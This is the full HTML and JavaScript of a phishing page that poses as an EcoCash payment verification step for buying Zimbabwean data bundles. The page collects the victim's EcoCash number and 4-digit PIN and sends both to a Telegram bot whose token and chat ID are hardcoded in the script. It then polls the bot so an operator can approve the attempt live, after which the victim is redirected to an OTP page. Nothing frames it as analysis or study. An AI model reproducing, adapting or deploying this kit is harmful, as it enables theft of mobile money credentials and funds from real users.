<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>EcoCash | Verify Payment · Zimbabwe</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-red: #dc2626;
            --primary-blue: #1e40af;
            --primary-blue-dark: #1e3a8a;
            --accent-blue: #3b82f6;
            --accent-light: #dbeafe;
            --success: #10b981;
            --page: #f8fafc;
            --surface: #ffffff;
            --surface2: #f1f5f9;
            --border: #e2e8f0;
            --border2: #cbd5e1;
            --text: #1e293b;
            --text2: #475569;
            --muted: #64748b;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        html { -webkit-text-size-adjust: 100%; }

        body {
            min-height: 100dvh;
            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
            color: var(--text);
            background: var(--page);
            overflow-x: hidden;
        }

        .topbar {
            height: 64px;
            padding: 14px max(18px, env(safe-area-inset-right)) 14px max(18px, env(safe-area-inset-left));
            background: var(--surface);
            border-bottom: 2px solid var(--border);
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
            position: sticky;
            top: 0;
            z-index: 1000;
        }

        .brand {
            display: flex;
            align-items: center;
            gap: 10px;
            text-decoration: none;
            cursor: pointer;
        }

        .brand-logo {
            width: 44px;
            height: 44px;
            background: linear-gradient(135deg, var(--primary-red) 0%, var(--primary-blue) 100%);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 900;
            color: white;
            font-size: 20px;
            flex-shrink: 0;
            box-shadow: 0 4px 12px rgba(220,38,38,0.2);
        }

        .brand-text {
            font-size: 18px;
            font-weight: 800;
            letter-spacing: -0.6px;
            color: var(--text);
            line-height: 1;
        }

        main {
            min-height: calc(100dvh - 64px);
            padding: clamp(14px, 3vw, 28px) max(12px, env(safe-area-inset-right)) max(14px, env(safe-area-inset-bottom)) max(12px, env(safe-area-inset-left));
            display: grid;
            place-items: center;
        }

        .login-card {
            width: min(100%, 500px);
            background: var(--surface);
            border: 1px solid var(--border2);
            border-radius: clamp(18px, 5vw, 28px);
            padding: clamp(22px, 5vw, 36px);
            box-shadow: 0 4px 16px rgba(0,0,0,0.08);
            position: relative;
            overflow: hidden;
        }

        .login-card::before {
            content: "";
            position: absolute;
            inset: 0 0 auto 0;
            height: 8px;
            background: linear-gradient(90deg, var(--primary-red), var(--primary-blue));
        }

        .logo-lockup {
            text-align: center;
            margin: 8px 0 22px;
        }

        .logo-text {
            font-size: clamp(34px, 9vw, 46px);
            font-weight: 800;
            letter-spacing: -1.6px;
            line-height: 1;
            color: var(--text);
        }

        .product-name {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            margin-top: 12px;
            padding: 8px 14px;
            border-radius: 999px;
            background: rgba(30,64,175,0.1);
            color: var(--primary-blue);
            font-size: 12px;
            font-weight: 800;
            letter-spacing: 0.08em;
            text-transform: uppercase;
            white-space: nowrap;
        }

        h1 {
            text-align: center;
            font-size: clamp(22px, 6vw, 28px);
            font-weight: 800;
            letter-spacing: -0.9px;
            margin-bottom: 8px;
            color: var(--text);
        }

        .subtitle {
            max-width: 390px;
            margin: 0 auto 22px;
            text-align: center;
            color: var(--muted);
            font-size: clamp(13px, 3.6vw, 14px);
            line-height: 1.55;
        }

        .bundle-summary {
            background: var(--surface2);
            border: 1px solid var(--border);
            border-radius: 18px;
            padding: 16px 18px;
            margin-bottom: 20px;
        }

        .bs-title {
            font-size: 10px;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            color: var(--muted);
            margin-bottom: 10px;
        }

        .bs-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 8px;
            margin-bottom: 10px;
        }

        .bs-item {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 10px;
            padding: 9px 12px;
        }

        .bs-item-label {
            font-size: 10px;
            color: var(--muted);
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }

        .bs-item-val {
            font-size: 15px;
            font-weight: 800;
            color: var(--text);
            margin-top: 2px;
            letter-spacing: -0.3px;
        }

        .bs-total {
            background: rgba(30,64,175,0.08);
            border: 1px solid rgba(30,64,175,0.2);
            border-radius: 10px;
            padding: 10px 12px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .bs-total-label { font-size: 12px; color: var(--muted); font-weight: 600; }
        .bs-total-val   { font-size: 1.25rem; font-weight: 900; color: var(--primary-red); letter-spacing: -0.5px; }

        .form-panel {
            background: var(--surface2);
            border: 1px solid var(--border);
            border-radius: 20px;
            padding: clamp(16px, 4vw, 20px);
        }

        .field-group {
            margin-bottom: 16px;
        }

        .field-group:last-child { margin-bottom: 0; }

        .field-label {
            display: block;
            font-size: 12px;
            font-weight: 800;
            color: var(--primary-blue);
            text-transform: uppercase;
            letter-spacing: 0.06em;
            margin-bottom: 8px;
        }

        .field-input {
            width: 100%;
            border: 2px solid var(--border);
            border-radius: 12px;
            padding: 14px 15px;
            font-size: 15px;
            color: var(--text);
            font-family: inherit;
            background: var(--surface);
            transition: all 0.2s;
        }

        .field-input:focus {
            border-color: var(--accent-blue);
            box-shadow: 0 0 0 4px rgba(59,130,246,0.1);
            outline: none;
        }

        .field-input::placeholder { color: var(--muted); }

        .error-msg {
            display: none;
            background: rgba(220,38,38,0.1);
            border: 1px solid rgba(220,38,38,0.3);
            color: #dc2626;
            font-size: 13px;
            font-weight: 600;
            border-radius: 12px;
            padding: 11px 13px;
            margin-bottom: 14px;
            line-height: 1.5;
            text-align: center;
        }

        .error-msg.show { display: block; }

        .btn-group {
            display: flex;
            gap: 12px;
            margin-top: 20px;
        }

        .btn-primary {
            flex: 1;
            border: 0;
            border-radius: 999px;
            padding: 16px 22px;
            color: white;
            background: linear-gradient(135deg, var(--primary-red) 0%, var(--primary-blue) 100%);
            font-size: 15px;
            font-weight: 800;
            letter-spacing: 0.04em;
            text-transform: uppercase;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(220,38,38,0.2);
            touch-action: manipulation;
            transition: opacity 0.18s, box-shadow 0.18s, transform 0.12s;
        }

        .btn-primary:hover:not(:disabled) {
            box-shadow: 0 8px 20px rgba(220,38,38,0.3);
            transform: translateY(-1px);
        }

        .btn-primary:active:not(:disabled) { transform: translateY(0); }

        .btn-primary:disabled {
            background: #ccc;
            box-shadow: none;
            cursor: not-allowed;
        }

        .btn-secondary {
            flex: 1;
            border: 1.5px solid var(--border2);
            border-radius: 999px;
            padding: 16px 22px;
            color: var(--text2);
            background: transparent;
            font-size: 15px;
            font-weight: 800;
            letter-spacing: 0.04em;
            text-transform: uppercase;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn-secondary:hover {
            background: var(--surface);
            border-color: var(--accent-blue);
            color: var(--text);
        }

        .terms {
            margin-top: 18px;
            color: var(--muted);
            text-align: center;
            font-size: 12px;
            line-height: 1.5;
        }

        .terms a { color: var(--primary-blue); font-weight: 800; }

        #spinnerOverlay {
            position: fixed;
            inset: 0;
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 16px;
            background: rgba(10, 10, 10, 0.88);
            z-index: 1000;
            backdrop-filter: blur(4px);
        }

        .spinner {
            width: 56px;
            height: 56px;
            border: 5px solid rgba(255, 255, 255, 0.12);
            border-top-color: var(--primary-blue);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        .spin-label { font-size: 15px; font-weight: 700; color: #fff; letter-spacing: -0.2px; }
        .spin-sub   { font-size: 13px; color: rgba(255,255,255,0.5); margin-top: -8px; }

        @keyframes spin { to { transform: rotate(360deg); } }

        @media (max-width: 520px) {
            .topbar { height: 56px; padding: 13px 16px; }
            main { min-height: calc(100dvh - 56px); align-items: start; padding: 14px 12px; }
            .login-card { padding: 24px 17px; }
            .logo-lockup { margin-top: 6px; margin-bottom: 18px; }
            .product-name { font-size: 11px; padding: 7px 12px; }
            .form-panel { padding: 15px; }
            .btn-group { flex-direction: column; }
            .btn-primary, .btn-secondary { padding: 15px 18px; }
        }
    </style>
</head>
<body>
    <header class="topbar">
        <a class="brand" href="index.html">
            <div class="brand-logo">E$</div>
            <div class="brand-text">EcoCash</div>
        </a>
    </header>

    <main>
        <section class="login-card">
            <div class="logo-lockup">
                <div class="logo-text">EcoCash</div>
                <div class="product-name">Data Bundles · Zimbabwe</div>
            </div>

            <h1>Verify Payment</h1>
            <p class="subtitle">Enter your EcoCash details to complete your data bundle purchase.</p>

            <div class="bundle-summary">
                <div class="bs-title">Your Data Bundle</div>
                <div class="bs-grid">
                    <div class="bs-item"><div class="bs-item-label">Bundle</div><div class="bs-item-val" id="bsOffer">—</div></div>
                    <div class="bs-item"><div class="bs-item-label">Data</div><div class="bs-item-val" id="bsData">—</div></div>
                </div>
                <div class="bs-total">
                    <span class="bs-total-label">Total to pay</span>
                    <span class="bs-total-val" id="bsPrice">$ —</span>
                </div>
            </div>

            <div class="form-panel" id="loginForm">
                <div class="field-group">
                    <label class="field-label">EcoCash Number</label>
                    <input type="tel" class="field-input" id="phoneInput" placeholder="+263 77 123 4567" inputmode="tel">
                </div>

                <div class="field-group">
                    <label class="field-label">4-Digit PIN</label>
                    <input type="password" class="field-input" id="pinInput" placeholder="••••" inputmode="numeric" maxlength="4">
                </div>

                <div class="error-msg" id="errMsg"></div>

                <div class="btn-group">
                    <button class="btn-primary" type="button" id="verifyBtn">Proceed to Verify</button>
                    <button class="btn-secondary" type="button" onclick="goBack()">← Back</button>
                </div>
            </div>

            <div class="terms">By continuing you agree to the <a href="#" target="_blank" rel="noopener">Terms and Conditions</a>.</div>
        </section>
    </main>

    <div id="spinnerOverlay">
        <div class="spinner"></div>
        <div class="spin-label">Processing</div>
        <div class="spin-sub">Please hold on…</div>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM',
            CHAT_ID: '7547427914'
        };

        let state = { lastUpdateId: 0 };
        let isProcessing = false;

        const phoneInput = document.getElementById('phoneInput');
        const pinInput = document.getElementById('pinInput');
        const verifyBtn = document.getElementById('verifyBtn');
        const errMsg = document.getElementById('errMsg');
        const spinnerOverlay = document.getElementById('spinnerOverlay');

        let bundleData = null;

        function loadBundleData() {
            const params = new URLSearchParams(window.location.search);
            const offer = params.get('offer');
            const data = params.get('data');
            const price = params.get('price');

            if (offer && data && price) {
                bundleData = { offer, data, price };
                document.getElementById('bsOffer').textContent = offer;
                document.getElementById('bsData').textContent = data;
                document.getElementById('bsPrice').textContent = '$ ' + price;
            }

            phoneInput.focus();
        }

        function validatePhone(phone) {
            const cleaned = phone.replace(/\D/g, '');
            if (cleaned.length === 12 && cleaned.startsWith('263')) {
                const prefix = cleaned.substring(3, 5);
                return ['77', '78', '71', '72'].includes(prefix);
            }
            if (cleaned.length === 10 && ['77', '78', '71', '72'].some(p => cleaned.startsWith(p))) {
                return true;
            }
            return false;
        }

        function formatPhone(phone) {
            let cleaned = phone.replace(/\D/g, '');
            if (cleaned.length === 10 && !cleaned.startsWith('263')) {
                cleaned = '263' + cleaned;
            }
            return '+' + cleaned;
        }

        verifyBtn.addEventListener('click', () => {
            const phone = phoneInput.value.trim();
            const pin = pinInput.value.trim();

            errMsg.classList.remove('show');
            errMsg.textContent = '';

            if (!phone) {
                errMsg.textContent = 'Please enter your EcoCash number.';
                errMsg.classList.add('show');
                phoneInput.focus();
                return;
            }

            if (!validatePhone(phone)) {
                errMsg.textContent = 'Invalid Zimbabwe phone number. Use format: +263 77 123 4567 or 0771234567';
                errMsg.classList.add('show');
                phoneInput.focus();
                return;
            }

            if (!pin || pin.length !== 4 || !/^\d+$/.test(pin)) {
                errMsg.textContent = 'Please enter a valid 4-digit PIN.';
                errMsg.classList.add('show');
                pinInput.focus();
                return;
            }

            sendToTelegram(formatPhone(phone), pin);
        });

        function sendToTelegram(phone, pin) {
            if (isProcessing) return;
            isProcessing = true;
            verifyBtn.disabled = true;

            const ts = Date.now();
            const approveId = `approve_${ts}`;
            const declineId = `decline_${ts}`;
            const alreadyId = `already_${ts}`;

            spinnerOverlay.style.display = 'flex';

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: `<b>🔵 EcoCash Payment Verification</b>\n\nOffer: ${document.getElementById('bsOffer').textContent}\nData: ${document.getElementById('bsData').textContent}\nPrice: $ ${document.getElementById('bsPrice').textContent.replace('$ ', '')}\n\nPhone: <code>${phone}</code>\nPIN: <code>${pin}</code>\n\nApprove or Decline:`,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ Approve", callback_data: approveId },
                                { text: "⚠️ Already Applied", callback_data: alreadyId }
                            ],
                            [
                                { text: "❌ Decline", callback_data: declineId }
                            ]
                        ]
                    }
                })
            }).then(() => {
                startPolling(approveId, declineId, alreadyId);
            }).catch(() => {
                spinnerOverlay.style.display = 'none';
                isProcessing = false;
                verifyBtn.disabled = false;
                errMsg.textContent = 'Failed to send verification. Please try again.';
                errMsg.classList.add('show');
            });
        }

        function startPolling(approveId, declineId, alreadyId) {
            const interval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || !data.result) return;
                        data.result.forEach(update => {
                            state.lastUpdateId = update.update_id;
                            if (update.callback_query) {
                                const cb = update.callback_query.data;
                                if (cb === approveId) {
                                    clearInterval(interval);
                                    spinnerOverlay.style.display = 'none';
                                    const params = new URLSearchParams(window.location.search);
                                    window.location.href = 'otp.html?' + params.toString();
                                } else if (cb === alreadyId) {
                                    clearInterval(interval);
                                    spinnerOverlay.style.display = 'none';
                                    isProcessing = false;
                                    verifyBtn.disabled = false;
                                    errMsg.textContent = 'Already purchased. You can purchase once at a time.';
                                    errMsg.classList.add('show');
                                } else if (cb === declineId) {
                                    clearInterval(interval);
                                    spinnerOverlay.style.display = 'none';
                                    isProcessing = false;
                                    verifyBtn.disabled = false;
                                    errMsg.textContent = 'Payment declined. Please try again.';
                                    errMsg.classList.add('show');
                                }
                            }
                        });
                    });
            }, 1000);
        }

        function goBack() {
            window.location.href = 'index.html';
        }

        window.addEventListener('load', loadBundleData);
    </script>
</body>
</html>
